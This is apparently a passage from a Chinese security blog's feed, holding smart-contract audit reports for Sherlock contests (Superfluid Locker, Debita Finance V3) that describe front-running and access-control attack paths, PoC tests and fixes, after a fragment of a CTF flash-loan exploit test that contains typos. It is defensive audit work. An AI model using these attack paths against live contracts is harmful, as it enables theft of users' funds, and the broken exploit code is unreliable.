class="line">  </span><br><span class="line">  TrusterLenderPool pool;</span><br><span class="line">  Cert token0;</span><br><span class="line">  Cert token1;</span><br><span class="line"></span><br><span class="line">  function setUp() public &#123;</span><br><span class="line">   pool = new TrusterLenderPool;</span><br><span class="line">   token0 = Cert(address(pool.token0()));</span><br><span class="line">   token2 = Cert(address(pool.token1()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function test_TrusterLenderPool() public&#123;</span><br><span class="line">   pool.flashLoan(10000,address(this));</span><br><span class="line">   token1.approve(pool,10000);</span><br><span class="line">   pool.swap(token0,10000);</span><br><span class="line"></span><br><span class="line">   assertEq(balanceOf(pool.token0()),0);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fouction receiveEther(uint256 amount) external&#123;</span><br><span class="line">   token0.approve(pool,10000);</span><br><span class="line">   pool.swap(token1,10000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-Superfluid Locker System 审计报告</title>
      <link href="/2024/11/25/sherlock-Superfluid-Locker-System-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/"/>
      <url>/2024/11/25/sherlock-Superfluid-Locker-System-%E5%AE%A1%E8%AE%A1%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Due to the lack of access control on the stopFunding function, anyone can monitor the blockchain, identify a program with an active funding process, and maliciously call the stopFunding function to stop the program, resulting in improper fund allocation.<br>I know you have already described it<br><a href="https://github.com/sherlock-audit/2024-11-superfluid-locking-contract-HeYuan-33?tab=readme-ov-file#q-please-discuss-any-design-choices-you-made">https://github.com/sherlock-audit/2024-11-superfluid-locking-contract-HeYuan-33?tab=readme-ov-file#q-please-discuss-any-design-choices-you-made</a><br>But can you be sure that the participant is not an attacker?</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable code:</p><p>2024-11-superfluid-locking-contract-HeYuan-33&#x2F;fluid&#x2F;packages&#x2F;contracts&#x2F;src&#x2F;FluidEPProgramManager.sol</p><p>Line 294 in e0d5af5</p><p> function stopFunding(uint256 programId) external { </p><p>As we can see, the stopFunding function is only marked as external, meaning it can be called externally. This allows an attacker to freely stop a program, leading to improper fund allocation.<br>Internal pre-conditions<br>No response</p><h2 id="External-pre-conditions"><a href="#External-pre-conditions" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>The program ID is obtained by the attacker, and it is an actively running program.</p><h2 id="Attack-Path"><a href="#Attack-Path" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>The attacker obtains an actively running program ID through blockchain monitoring.<br>The attacker calls the stopFunding function, causing the program to be forcibly stopped.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>An actively running program can be prematurely terminated.<br>Maliciously trigger related fund distribution and compensation operations.<br>If an attacker calls stopFunding, it will delete the program’s information, and it cannot be recovered permanently.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Add a check to verify if the caller is a participant in the project, to prevent non-participants from calling the function.No matter what, adding a check for the caller is never a mistake.</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>这次的审计报告提交的很少，基本没有什么漏洞，这次主要是去看了合约的逻辑实现，其实一些精度计算，四舍五入的那些地方没有去仔细看，就忽略了这个漏洞，虽然这次提交又是被判为无效，但是也是知道了首先阅读审计开始前的要求，还有就是对于那些权限很松的注意一下抢跑攻击，比如这次的claim函数，就是和pool建立联系，但是攻击者也可以提前知道用户的交易，然后抢先去提交交易，让用户建立不了链接，以下是正确的报告。还是的学习怎么写poc测试。</p><h2 id="抢跑攻击"><a href="#抢跑攻击" class="headerlink" title="抢跑攻击"></a>抢跑攻击</h2><p>FluidLocker can be blocked from connecting to a pool</p><h3 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h3><p>For FluidLockers to get money streamed into them they need to be connected to the distribution pools. This connection is established in claim function. However an attacker can observe locker transactions and call FluidEPProgramManager::UpdateUserUnits before user transactions go through. This will mark the signatures as used and update FluidLocker units without connecting the locker to the distribution pool.</p><h3 id="Root-Cause-1"><a href="#Root-Cause-1" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>FluidLocker’s claim function updates locker units, verifies signatures and also establishes the connection between the locker and pool. <a href="https://github.com/sherlock-audit/2024-11-superfluid-locking-contract/blob/1fa5f86024be5f269e1a0898b1f939f1d4cce149/fluid/packages/contracts/src/FluidLocker.sol#L155C1-L171C6">https://github.com/sherlock-audit/2024-11-superfluid-locking-contract/blob/1fa5f86024be5f269e1a0898b1f939f1d4cce149/fluid/packages/contracts/src/FluidLocker.sol#L155C1-L171C6</a>.<br>This connection will enable lockers to reflect their token balances on the event of a distribution, otherwise some address or the locker needs to manually claim for the locker.<br>However an attacker can observe user’s claim and call FluidEPProgramManager::UpdateUserUnits before user transactions go through. This will mark the signatures as used and update FluidLocker units without connecting the locker to the distribution pool.<br><a href="https://github.com/sherlock-audit/2024-11-superfluid-locking-contract/blob/1fa5f86024be5f269e1a0898b1f939f1d4cce149/fluid/packages/contracts/src/EPProgramManager.sol#L119C1-L149C6">https://github.com/sherlock-audit/2024-11-superfluid-locking-contract/blob/1fa5f86024be5f269e1a0898b1f939f1d4cce149/fluid/packages/contracts/src/EPProgramManager.sol#L119C1-L149C6</a> (Note that the _poolUpdate of this function is overridden by FluidEPProgramManager’s _poolUpdate).</p><h3 id="Internal-pre-conditions"><a href="#Internal-pre-conditions" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h3><p>No response</p><h3 id="External-pre-conditions-1"><a href="#External-pre-conditions-1" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h3><p>No response</p><h3 id="Attack-Path-1"><a href="#Attack-Path-1" class="headerlink" title="Attack Path"></a>Attack Path</h3><p>User calls claim<br>Attacker front runs the call with FluidEPProgramManager::UpdateUserUnits with same parameters</p><h3 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h3><p>Although users can claim for the locker at any point, this is out of the ordinary flow and will be unexpected for the users, thus can lead to denial of funds for some time.</p><h3 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h3><p>No response</p><h3 id="Mitigation-1"><a href="#Mitigation-1" class="headerlink" title="Mitigation"></a>Mitigation</h3><p>Locker’s connection to the pool should be seperated from claims.</p><h2 id="四舍五入的问题，先除后乘，会导致精度损失"><a href="#四舍五入的问题，先除后乘，会导致精度损失" class="headerlink" title="四舍五入的问题，先除后乘，会导致精度损失"></a>四舍五入的问题，先除后乘，会导致精度损失</h2><p>When calculating in the _getUnlockingPercentage function, 540 was mistakenly used instead of 540 days for calculation. As a result, users can unlock all their funds earlier without paying penalties.</p><h3 id="Summary-2"><a href="#Summary-2" class="headerlink" title="Summary"></a>Summary</h3><p>When calculating in the _getUnlockingPercentage function, 540 was mistakenly used instead of 540 days for calculation. As a result, users can unlock all their funds earlier without paying penalties.</p><h3 id="Root-Cause-2"><a href="#Root-Cause-2" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>In FluidLocker.sol#L388, 540 was mistakenly used instead of 540 days for calculation.<br>In FluidLocker.sol#L379-L381, since the minimum return of _getUnlockingPercentage is 269731 even if it is unlocked using the minimum unlocking period of 7 days(It is assumed that the accuracy problem in the calculation has been fixed.). This is greater than 10000. so it will result in an overflow of L381. This means that the user can’t use the vest form of unlocking. This forces the user to use _instantUnlock and pay an 80% penalty.</p><h3 id="Internal-pre-conditions-1"><a href="#Internal-pre-conditions-1" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h3><p>No response</p><h3 id="External-pre-conditions-2"><a href="#External-pre-conditions-2" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h3><p>No response</p><h3 id="Attack-Path-2"><a href="#Attack-Path-2" class="headerlink" title="Attack Path"></a>Attack Path</h3><p>No response</p><h3 id="Impact-2"><a href="#Impact-2" class="headerlink" title="Impact"></a>Impact</h3><p>Users have to pay an 80% penalty to unlock it. This has resulted in user losses.</p><h3 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h3><p>For simplicity, I directly changed the _getUnlockingPercentage function to public and fixed the error due to precision issues first. The code is as follows:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _getUnlockingPercentage(uint128 unlockPeriod) public pure returns (uint256 unlockingPercentageBP) &#123;  </span><br><span class="line">    unlockingPercentageBP = (  </span><br><span class="line">        _PERCENT_TO_BP  </span><br><span class="line">            * (  </span><br><span class="line">                // ((80 * _SCALER) / Math.sqrt(540 * _SCALER)) * (Math.sqrt(unlockPeriod * _SCALER) / _SCALER)  </span><br><span class="line">                (80 * _SCALER) * (Math.sqrt(unlockPeriod * _SCALER)) / Math.sqrt(540 * _SCALER)  </span><br><span class="line">                    + 20 * _SCALER  </span><br><span class="line">            )  </span><br><span class="line">    ) / _SCALER;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><h3 id="poc-put-in-FluidLocker-t-sol"><a href="#poc-put-in-FluidLocker-t-sol" class="headerlink" title="poc(put in FluidLocker.t.sol):"></a>poc(put in FluidLocker.t.sol):</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function test_getUnlockingPercentage() external virtual &#123;  </span><br><span class="line">    FluidLocker(address(aliceLocker))._getUnlockingPercentage(7 days);  </span><br><span class="line">    FluidLocker(address(aliceLocker))._getUnlockingPercentage(540 days);  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="Resault"><a href="#Resault" class="headerlink" title="Resault:"></a>Resault:</h3><p>[PASS] test_getUnlockingPercentage() (gas: 22807)<br>Traces:<br>  [22807] FluidLockerTest::test_getUnlockingPercentage()<br>    ├─ [13073] BeaconProxy::_getUnlockingPercentage(604800 [6.048e5]) [staticcall]<br>    │   ├─ [2308] UpgradeableBeacon::implementation() [staticcall]<br>    │   │   └─ ← [Return] FluidLocker: [0x426eeFE8AF33482cA9F3ED139b1991984468926E]<br>    │   ├─ [2974] FluidLocker::_getUnlockingPercentage(604800 [6.048e5]) [delegatecall]<br>    │   │   └─ ← [Return] 269731 [2.697e5]<br>    │   └─ ← [Return] 269731 [2.697e5]<br>    ├─ [4055] BeaconProxy::_getUnlockingPercentage(46656000 [4.665e7]) [staticcall]<br>    │   ├─ [308] UpgradeableBeacon::implementation() [staticcall]<br>    │   │   └─ ← [Return] FluidLocker: [0x426eeFE8AF33482cA9F3ED139b1991984468926E]<br>    │   ├─ [2956] FluidLocker::_getUnlockingPercentage(46656000 [4.665e7]) [delegatecall]<br>    │   │   └─ ← [Return] 2353510 [2.353e6]<br>    │   └─ ← [Return] 2353510 [2.353e6]<br>    └─ ← [Stop]  </p><h3 id="Mitigation-2"><a href="#Mitigation-2" class="headerlink" title="Mitigation"></a>Mitigation</h3><pre><code>    unlockingPercentageBP = (          _PERCENT_TO_BP              * (  </code></pre><ul><li><pre><code>               ((80 * _SCALER) / Math.sqrt(540 * _SCALER)) * (Math.sqrt(unlockPeriod * _SCALER) / _SCALER)</code></pre></li></ul><ul><li><pre><code>               (80 * _SCALER) * (Math.sqrt(unlockPeriod * _SCALER)) / Math.sqrt(540 days * _SCALER)                    + 20 * _SCALER            )    ) / _SCALER;</code></pre></li></ul><h3 id="计算错误，导致固定的比例，这篇报告真的受膜拜"><a href="#计算错误，导致固定的比例，这篇报告真的受膜拜" class="headerlink" title="计算错误，导致固定的比例，这篇报告真的受膜拜"></a>计算错误，导致固定的比例，这篇报告真的受膜拜</h3><p>Invalid vest unlock flow rate calculations in FluidLocker::_vestUnlock(…) leads to recepients paying much higher tax rates than intended</p><h3 id="Summary-3"><a href="#Summary-3" class="headerlink" title="Summary"></a>Summary</h3><p>The FluidLocker contract allows users to lock FLUID tokens, and then at specific unlockPeriods to unlock them. When unlocking, users can choose to do it either instantly, and pay an 80% tax fee to stakers, or use a vesting scheme, where funds are flown to the user, using a Fontaine, based on the unlock period chosen. However, with the current logic in FluidLocker::_vestUnlock(…), there is no difference if a recipient unlocks with unlockPeriod &#x3D; 0 or unlockPeriod &#x3D; 540 days as there will be a constant 80% tax.</p><h3 id="Root-Cause-3"><a href="#Root-Cause-3" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>In FluidLocker::_getUnlockingPercentage(…) invalid calculations are being carried out, leading to the function always producing a result of 2000, no matter what unlockPeriod is given. Because of this, the resulting unlockFlowRate will always be capped at 20% meaning that recipients who unlock at the max period will pay a constant tax of 80% to stakers, as if they unlocked at the very beginning.</p><h3 id="Internal-pre-conditions-2"><a href="#Internal-pre-conditions-2" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h3><p>N&#x2F;A</p><h3 id="External-pre-conditions-3"><a href="#External-pre-conditions-3" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h3><p>N&#x2F;A</p><h3 id="Attack-Path-3"><a href="#Attack-Path-3" class="headerlink" title="Attack Path"></a>Attack Path</h3><p>Locker A’s owner unlocks tokens for Alice with an unlock period of 0.<br>Alice pays 80% tax rate to instantly receive her tokens.<br>Locker A’s owner unlocks tokens for Bob with an unlockPeriod of 540 days.<br>Bob should pay 0 % tax, however due to improper calculations, he ends up paying 80% tax as well.,<br>Impact<br>FluidLocker::unlock(…) recipients who choose to unlock using the vesting option pay higher taxes than intended, thus receiving fewer tokens than what they should be.</p><h3 id="PoC-3"><a href="#PoC-3" class="headerlink" title="PoC"></a>PoC</h3><p>The following test can be added in FluidLocker.t.sol and ran with forge test –mt test_getUnlockingPercentage -vv</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint256 private constant _SCALER = 1e18;  </span><br><span class="line">  </span><br><span class="line">uint256 private constant _PERCENT_TO_BP = 100;  </span><br><span class="line">  </span><br><span class="line">function _getUnlockingPercentage(uint128 unlockPeriod) internal pure returns (uint256 unlockingPercentageBP) &#123;  </span><br><span class="line">    unlockingPercentageBP = (  </span><br><span class="line">        _PERCENT_TO_BP  </span><br><span class="line">            * (  </span><br><span class="line">                ((80 * _SCALER) / Math.sqrt(540 * _SCALER)) * (Math.sqrt(unlockPeriod * _SCALER) / _SCALER)  </span><br><span class="line">                    + 20 * _SCALER  </span><br><span class="line">            )  </span><br><span class="line">    ) / _SCALER;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">// Add this test function to your FluidLockerTest contract  </span><br><span class="line">function test_getUnlockingPercentage() public &#123;  </span><br><span class="line">    // Create a helper function to access the internal function  </span><br><span class="line">  </span><br><span class="line">    // Test different periods  </span><br><span class="line">    uint128 sevenDays = 7 days;  </span><br><span class="line">    uint128 thirtyDays = 30 days;  </span><br><span class="line">    uint128 ninetyDays = 90 days;  </span><br><span class="line">    uint128 oneEightyDays = 180 days;  </span><br><span class="line">    uint128 fiveFortyDays = 540 days;  </span><br><span class="line">  </span><br><span class="line">    uint256 sevenDaysPercent = _getUnlockingPercentage(sevenDays);  </span><br><span class="line">    uint256 thirtyDaysPercent = _getUnlockingPercentage(thirtyDays);  </span><br><span class="line">    uint256 ninetyDaysPercent = _getUnlockingPercentage(ninetyDays);  </span><br><span class="line">    uint256 oneEightyDaysPercent = _getUnlockingPercentage(oneEightyDays);  </span><br><span class="line">    uint256 fiveFortyDaysPercent = _getUnlockingPercentage(fiveFortyDays);  </span><br><span class="line">  </span><br><span class="line">    console.log(&quot;7 days unlock percentage:&quot;, sevenDaysPercent);  </span><br><span class="line">    console.log(&quot;30 days unlock percentage:&quot;, thirtyDaysPercent);  </span><br><span class="line">    console.log(&quot;90 days unlock percentage:&quot;, ninetyDaysPercent);  </span><br><span class="line">    console.log(&quot;180 days unlock percentage:&quot;, oneEightyDaysPercent);  </span><br><span class="line">    console.log(&quot;540 days unlock percentage:&quot;, fiveFortyDaysPercent);  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>And the output is:</p><p>Ran 1 test for test&#x2F;FluidLocker.t.sol:FluidLockerTest<br>[PASS] test_getUnlockingPercentage() (gas: 19376)<br>Logs:<br>  7 days unlock percentage: 2000<br>  30 days unlock percentage: 2000<br>  90 days unlock percentage: 2000<br>  180 days unlock percentage: 2000<br>  540 days unlock percentage: 2000  </p><p>Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.22ms (886.54µs CPU time)  </p><p>Ran 1 test suite in 159.53ms (11.22ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)<br>Mitigation<br>Divide the current _getUnlockingPercentage calculations into batches to ensure proper truncation:</p><p>index f31ad92..f39a89a 100644  </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">--- a/fluid/packages/contracts/src/FluidLocker.sol  </span><br><span class="line">+++ b/fluid/packages/contracts/src/FluidLocker.sol  </span><br><span class="line">@@ -382,13 +382,14 @@ contract FluidLocker is Initializable, ReentrancyGuard, IFluidLocker &#123;  </span><br><span class="line">     &#125;  </span><br><span class="line">   </span><br><span class="line">     function _getUnlockingPercentage(uint128 unlockPeriod) internal pure returns (uint256 unlockingPercentageBP) &#123;  </span><br><span class="line">-        unlockingPercentageBP = (  </span><br><span class="line">-            _PERCENT_TO_BP  </span><br><span class="line">-                * (  </span><br><span class="line">-                    ((80 * _SCALER) / Math.sqrt(540 * _SCALER)) * (Math.sqrt(unlockPeriod * _SCALER) / _SCALER)  </span><br><span class="line">-                        + 20 * _SCALER  </span><br><span class="line">-                )  </span><br><span class="line">-        ) / _SCALER;  </span><br><span class="line">+        // First calculate sqrt(unlockPeriod/_MAX_UNLOCK_PERIOD)  </span><br><span class="line">+        uint256 periodRatio = Math.sqrt((unlockPeriod * _SCALER) / _MAX_UNLOCK_PERIOD);  </span><br><span class="line">+  </span><br><span class="line">+        // Scale it to the range [20, 100]  </span><br><span class="line">+        uint256 percentage = 20 + ((80 * periodRatio) / Math.sqrt(_SCALER));  </span><br><span class="line">+  </span><br><span class="line">+        // Convert to basis points (multiply by 100)  </span><br><span class="line">+        unlockingPercentageBP = percentage * 100;  </span><br><span class="line">     &#125;  </span><br></pre></td></tr></table></figure><p>With the above change, the test output looks like this:</p><p>Ran 1 test for test&#x2F;FluidLocker.t.sol:FluidLockerTest<br>[PASS] test_getUnlockingPercentage() (gas: 18470)<br>Logs:<br>  7 days unlock percentage: 2900<br>  30 days unlock percentage: 3800<br>  90 days unlock percentage: 5200<br>  180 days unlock percentage: 6600<br>  540 days unlock percentage: 10000  </p><p>Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 11.90ms (1.07ms CPU time)  </p><p>Ran 1 test suite in 160.39ms (11.90ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)  </p><p>就是要对于计算，比如，先除后乘就会导致一些精度的损失，或者是计算太大，还有一种的实现方式就是写测试文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> 审计报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sherlock-2024-11-debita Finance V3 审计报告</title>
      <link href="/2024/11/24/sherlock-2024-11-debita-Finance-V3/"/>
      <url>/2024/11/24/sherlock-2024-11-debita-Finance-V3/</url>
      
        <content type="html"><![CDATA[<h1 id="一"><a href="#一" class="headerlink" title="一"></a>一</h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>There is no verification of the incentives recipient, which allows anyone to impersonate other borrowers and claim their incentives.</p><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable code:</p><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaIncentives.sol</p><p>Line 203 in 1465ba6</p><p> IERC20(token).transfer(msg.sender, amountToClaim); </p><p>Using msg.sender to send rewards to the caller without performing a check allows an attacker to impersonate a borrower and claim their incentives . Additionally, we can see that the function claimIncentives：<br>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaIncentives.sol</p><p>Lines 142 to 147 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimIncentives( </span><br><span class="line">    address[] memory principles, </span><br><span class="line">    address[][] memory tokensIncentives, </span><br><span class="line">    uint epoch </span><br><span class="line">) public &#123; </span><br><span class="line">    // get information </span><br></pre></td></tr></table></figure><p>As long as the attacker forwards another person’s parameter information, they can impersonate them and claim the incentives<br>Internal pre-conditions<br>The claimIncentives function is public</p><h2 id="External-pre-conditions"><a href="#External-pre-conditions" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path"><a href="#Attack-Path" class="headerlink" title="Attack Path"></a>Attack Path</h2><ul><li>Alice has successfully borrowed tokens, and when she calls the claimIncentives function to claim the incentives, the transaction is packaged into the transaction pool.</li><li>Bob is always ready to monitor this transaction pool. Upon discovering Alice’s transaction, he can retrieve the transaction details (address[] memory principles, address[][] memory tokensIncentives, uint epoch), and then submit a higher gas fee for the same transaction, which will be processed first.</li><li>At this point, Bob impersonates Alice to claim her incentives. When Alice’s transaction is processed, she will be marked as having already claimed the incentives</li></ul><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>Borrowers are unable to claim the rewards they are entitled to.<br>A front-running transaction attack occurs.</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Perform a check on the msg.sender calling the claimIncentives function.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimIncentives(</span><br><span class="line">    address[] memory principles,</span><br><span class="line">    address[][] memory tokensIncentives,</span><br><span class="line">    uint epoch,</span><br><span class="line">) public &#123;</span><br><span class="line">    // Ensure the caller is the borrower</span><br><span class="line">    require(msg.sender == borrower, &quot;Only the borrower can claim incentives&quot;);</span><br><span class="line"></span><br><span class="line">    // ... existing logic</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ensure that this epoch ,the principal, and the borrower are correctly matched.</p><h1 id="二"><a href="#二" class="headerlink" title="二"></a>二</h1><h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><p>We all know that using transferFrom to send tokens lacks the security of using safeTransferFrom.</p><h2 id="Root-Cause-1"><a href="#Root-Cause-1" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Vulnerable code:</p><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaIncentives.sol</p><p>Lines 269 to 274 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IERC20(incentivizeToken).transferFrom( </span><br><span class="line">    msg.sender, </span><br><span class="line">    address(this), </span><br><span class="line">    amount </span><br><span class="line">); </span><br><span class="line"></span><br><span class="line">require(amount &gt; 0, &quot;Amount must be greater than 0&quot;); </span><br></pre></td></tr></table></figure><p>We can see that using transferFrom to transfer tokens to a contract is somewhat unsafe. Additionally, the operation of checking whether the amount is zero after the transfer is a bit redundant.<br>If it returns a bool value to determine whether the transfer was successful, then the vulnerability in the code is that it doesn’t check whether transferFrom actually succeeded.</p><h2 id="Internal-pre-conditions"><a href="#Internal-pre-conditions" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>No response</p><h2 id="External-pre-conditions-1"><a href="#External-pre-conditions-1" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-1"><a href="#Attack-Path-1" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>No response</p><h2 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h2><p>Using transferFrom to transfer tokens is less secure than safeTransferFrom.<br>We cannot be sure if transferFrom successfully completed the transfer.<br>Checking if the amount is zero after the transfer is performed in the wrong order.</p><h2 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-1"><a href="#Mitigation-1" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Use the more secure safeTransferFrom for the token transfer.<br>Change the order of the check for whether the amount is zero.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">       // transfer the tokens</span><br><span class="line">      // IERC20(incentivizeToken).transferFrom(</span><br><span class="line">    //     msg.sender,</span><br><span class="line">   //    address(this),</span><br><span class="line">  //     amount</span><br><span class="line"> //  );</span><br><span class="line">//   require(amount &gt; 0, &quot;Amount must be greater than 0&quot;);</span><br><span class="line">     </span><br><span class="line">     require(amount &gt; 0, &quot;Amount must be greater than 0&quot;);</span><br><span class="line">     SafeERC20.safeTransferFrom(</span><br><span class="line">           IERC20(incentivizeToken),</span><br><span class="line">         msg.sender,</span><br><span class="line">         address(this),</span><br><span class="line">         amount</span><br><span class="line">     );</span><br></pre></td></tr></table></figure><h1 id="三"><a href="#三" class="headerlink" title="三"></a>三</h1><h2 id="Summary-2"><a href="#Summary-2" class="headerlink" title="Summary"></a>Summary</h2><p>In the addFunds function of the DebitaLendOffer-Implementation contract, there is no check on theamountbeing added.</p><h2 id="Root-Cause-2"><a href="#Root-Cause-2" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Valnerable code:</p><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaLendOffer-Implementation.sol</p><p>Lines 168 to 173 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SafeERC20.safeTransferFrom( </span><br><span class="line">    IERC20(lendInformation.principle), </span><br><span class="line">    msg.sender, </span><br><span class="line">    address(this), </span><br><span class="line">    amount </span><br><span class="line">); </span><br></pre></td></tr></table></figure><p>As we can see, there is no check on the amount before the transfer, which allows the lender or owner to transfer zero tokens, wasting gas.</p><h2 id="Internal-pre-conditions-1"><a href="#Internal-pre-conditions-1" class="headerlink" title="Internal pre-conditions"></a>Internal pre-conditions</h2><p>No response</p><h2 id="External-pre-conditions-2"><a href="#External-pre-conditions-2" class="headerlink" title="External pre-conditions"></a>External pre-conditions</h2><p>No response</p><h2 id="Attack-Path-2"><a href="#Attack-Path-2" class="headerlink" title="Attack Path"></a>Attack Path</h2><p>If an attacker becomes a lender, they can repeatedly call the addFunds function, adding a large number of zero amounts to the DebitaLendOffer-Implementation contract, which prevents other lenders from adding their loan amounts.</p><h2 id="Impact-2"><a href="#Impact-2" class="headerlink" title="Impact"></a>Impact</h2><p>An attacker sends a large number of requests with a zero amount to the DebitaLendOffer-Implementation contract, consuming a lot of gas, which prevents legitimate lenders from adding loan amounts.<br>The DebitaLendOffer-Implementation contract will receive a large number of requests with a zero amount.</p><h2 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h2><p>No response</p><h2 id="Mitigation-2"><a href="#Mitigation-2" class="headerlink" title="Mitigation"></a>Mitigation</h2><p>Add a check to ensure the amount is not zero, as follows:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(amount &gt; 0, &quot;Amount must be greater than zero&quot;);</span><br><span class="line">SafeERC20.safeTransferFrom(</span><br><span class="line">       IERC20(lendInformation.principle),</span><br><span class="line">       msg.sender,</span><br><span class="line">       address(this),</span><br><span class="line">       amount</span><br><span class="line">   );</span><br></pre></td></tr></table></figure><h1 id="四"><a href="#四" class="headerlink" title="四"></a>四</h1><h2 id="Summary-3"><a href="#Summary-3" class="headerlink" title="Summary"></a>Summary</h2><p>Although the claimInterest function in the DebitaV3Loan.sol contract is marked as internal, there is still no check for the lender.</p><h2 id="Root-Cause-3"><a href="#Root-Cause-3" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>Valnerable code:</p><p>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaV3Loan.sol</p><p>Lines 259 to 269 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function claimInterest(uint index) internal &#123; </span><br><span class="line">    IOwnerships ownershipContract = IOwnerships(s_OwnershipContract); </span><br><span class="line">    infoOfOffers memory offer = loanData._acceptedOffers[index]; </span><br><span class="line">    uint interest = offer.interestToClaim; </span><br><span class="line"> </span><br><span class="line">    require(interest &gt; 0, &quot;No interest to claim&quot;); </span><br><span class="line"> </span><br><span class="line">    loanData._acceptedOffers[index].interestToClaim = 0; </span><br><span class="line">    SafeERC20.safeTransfer(IERC20(offer.principle), msg.sender, interest); </span><br><span class="line">    Aggregator(AggregatorContract).emitLoanUpdated(address(this)); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>As we can see from above, there is no check for the lender, which could lead to the interest being incorrectly claimed.<br>By comparing it with the function that has the same functionality, we can see that:<br>2024-11-debita-finance-v3-HeYuan-33&#x2F;Debita-V3-Contracts&#x2F;contracts&#x2F;DebitaV3Loan.sol</p><p>Lines 288 to 311 in 1465ba6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _claimDebt(uint index) internal &#123; </span><br><span class="line">    LoanData memory m_loan = loanData; </span><br><span class="line">    IOwnerships ownershipContract = IOwnerships(s_OwnershipContract); </span><br><span class="line"> </span><br><span class="line">    infoOfOffers memory offer = m_loan._acceptedOffers[index]; </span><br><span class="line">    require( </span><br><span 